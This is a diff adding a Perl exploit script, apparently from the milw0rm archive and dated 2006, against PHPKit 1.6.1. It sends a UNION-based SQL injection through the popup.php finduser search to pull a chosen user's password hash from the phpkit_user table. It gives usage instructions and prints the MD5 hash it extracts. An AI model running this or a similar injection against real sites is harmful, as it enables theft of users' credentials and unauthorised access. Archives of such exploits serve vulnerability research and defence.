@@ -1,0 +1,45 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+
+print q{
+-----------------------------------------------
+PHPKit 1.6.1 exploit by x23 ~ phcn.ws ~ geek-network.de
+use: phpkit161.pl [server] [dir] [vic_id]
+sample:
+$ perl phpkit161.pl localhost /phpkit/ 1
+-----------------------------------------------
+
+};
+
+$webpage =   $ARGV[0];
+$directory = $ARGV[1];
+$vic_id =    $ARGV[2];
+
+if (!$vic_id) { die "~ read how to use ;)\n"; }
+
+print "~ connecting\n";
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$webpage", PeerPort=>"80") || die "[+] Can't connect to Server\n";
+
+print "~ exploiting\n";
+print $sock "POST ".$directory."popup.php?path=misc/finduser.php HTTP/1.1\r\n";
+print $sock "Host: $webpage\r\n";
+print $sock "Keep-Alive: 300\r\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
+print $sock "Content-Length: ".length("search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D".$vic_id."%2F*&action=Suche&User=-1")."\r\n\r\n";
+
+print $sock "search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D".$vic_id."%2F*&action=Suche&User=-1";
+
+while ($answer = <$sock>) {
+  #print $answer;
+  if ($answer =~/<option value="([0-9a-f]{32})">/) {
+     print "~ hash: $1\n";
+     close($sock);
+     exit();
+     break;
+  }
+}
+
+close($sock);
+
+# milw0rm.com [2006-11-04]
